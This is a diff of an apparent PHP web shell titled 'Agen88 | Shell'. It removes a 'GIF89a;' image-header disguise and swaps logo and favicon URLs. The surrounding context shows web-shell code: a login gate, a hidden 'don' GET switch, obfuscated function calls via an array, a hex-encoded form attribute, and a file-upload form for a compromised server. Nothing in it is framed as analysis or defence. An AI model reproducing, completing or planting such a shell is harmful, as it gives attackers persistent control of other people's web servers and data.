@@ -1,4 +1,4 @@
-GIF89a;
+
 <?php
 session_start();
 @set_time_limit(0);
@@ -26,7 +26,7 @@ function login_shell()
         <meta charset="UTF-8">
         <meta http-equiv="X-UA-Compatible" content="IE=edge">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <link rel="shortcut icon" type="image/x-icon" href="https://i.ibb.co/KzStJrN/20240321-181338.png" />
+        <link rel="shortcut icon" type="image/x-icon" href="https://raw.githubusercontent.com/1llsion/imgAmp/main/demon.png" />
         <title>Agen88 | Login [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
         <style>
             body {
@@ -59,7 +59,7 @@ function login_shell()
 
     <body>
         <center>
-        <img src="https://i.ibb.co/yY3XMgF/kawai.png" style="margin-bottom: 10px; margin-top: 10px;" />
+        <img src="https://raw.githubusercontent.com/1llsion/imgAmp/main/demon.png" style="margin-bottom: 10px; margin-top: 10px;" />
         </center>
         <form action="" method="post">
             <div align="center">
@@ -159,7 +159,7 @@ if ($_GET['don'] == true) {
     <title>Agen88 | Shell [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
     <script src='https://kit.fontawesome.com/057b9b510c.js' crossorigin='anonymous'></script>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
-    <link rel="shortcut icon" type="image/x-icon" href="https://i.ibb.co/KzStJrN/20240321-181338.png" />
+    <link rel="shortcut icon" type="image/x-icon" href="https://raw.githubusercontent.com/1llsion/imgAmp/main/demon.png" />
     <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
     <style>
         .btn-submit,
@@ -568,7 +568,7 @@ if ($_GET['don'] == true) {
             <li><i class="fa-solid fa-globe"></i>&nbsp;<?= s(); ?></li>
             <li><i class="fa-brands fa-php"></i>&nbsp;<?= PHP_VERSION; ?></li>
             <li><i class="fa-solid fa-user"></i>&nbsp;<?= $fungsi[9](); ?></li>
-            <li class="logo-gecko"><img width="400" height="400" src="https://i.ibb.co/dfQ26SL/SeoHans.jpg" align="right"></li>
+            <li class="logo-gecko"><img width="400" height="400" src="https://raw.githubusercontent.com/1llsion/imgAmp/main/demon.png" align="right"></li>
             <form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>'>
                 <li class="form-upload"><input type="submit" value="Upload" name="gecko-up-submit" class="btn-submit">&nbsp;<input type="file" name="gecko-upload" class="form-file"></li>
             </form>
